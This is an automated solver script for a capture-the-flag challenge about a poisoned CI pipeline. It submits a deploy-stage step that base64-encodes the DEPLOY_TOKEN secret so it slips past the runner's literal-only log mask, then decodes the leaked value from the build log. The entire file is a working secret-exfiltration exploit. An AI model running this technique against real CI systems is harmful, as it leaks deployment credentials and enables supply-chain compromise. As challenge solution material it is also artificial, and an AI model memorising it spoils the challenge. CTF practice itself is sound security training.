#!/usr/bin/env python3
"""Automated solver for supplychain-poisoned-pipeline.

Submits a deploy-stage step that base64-encodes DEPLOY_TOKEN so the value slips
past the runner's literal-only log mask, then decodes it.

Usage: solve.py http://HOST:PORT
"""
import base64
import binascii
import json
import sys
import urllib.request


def main():
    if len(sys.argv) != 2:
        print("usage: solve.py http://HOST:PORT", file=sys.stderr)
        return 2
    base = sys.argv[1].rstrip("/")

    pipeline = {
        "pipeline": [
            # deploy stage => the step receives DEPLOY_TOKEN; base64 dodges the
            # literal-only mask.
            {"stage": "deploy", "run": 'printf %s "$DEPLOY_TOKEN" | base64'}
        ]
    }
    req = urllib.request.Request(
        base + "/build",
        data=json.dumps(pipeline).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = json.loads(urllib.request.urlopen(req, timeout=15).read().decode())
    log = resp["steps"][0]["log"].strip()
    try:
        flag = base64.b64decode(log).decode("utf-8", "replace").strip()
    except (binascii.Error, ValueError):
        print("[-] could not decode log:", log, file=sys.stderr)
        return 1
    if flag.startswith("NCTF{"):
        print("[+] flag:", flag)
        return 0
    print("[-] unexpected decode:", flag, "(raw log:", log, ")", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
